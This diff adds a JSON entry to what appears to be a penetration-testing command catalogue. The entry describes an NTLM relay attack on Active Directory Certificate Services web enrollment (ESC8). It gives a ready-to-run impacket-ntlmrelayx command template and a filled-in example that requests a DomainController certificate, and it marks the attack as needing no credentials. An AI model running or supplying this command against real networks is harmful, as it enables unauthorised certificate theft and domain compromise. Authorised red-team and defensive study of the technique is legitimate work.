@@ -1,0 +1,25 @@
+{
+  "id": "ntlmrelayx-adcs",
+  "name": "NTLM Relay to ADCS",
+  "command": "impacket-ntlmrelayx -t http://<ip>/certsrv/certfnsh.asp --adcs --template '<template>'",
+  "description": "Relay NTLM authentication to ADCS web enrollment to obtain a certificate",
+  "platform": "linux",
+  "requires": [
+    "no-creds"
+  ],
+  "protocols": [
+    "ntlm",
+    "http"
+  ],
+  "tags": [
+    "impacket",
+    "ntlmrelay",
+    "relay",
+    "adcs",
+    "esc8",
+    "certificate"
+  ],
+  "examples": [
+    "impacket-ntlmrelayx -t http://192.168.1.100/certsrv/certfnsh.asp --adcs --template 'DomainController'"
+  ]
+}
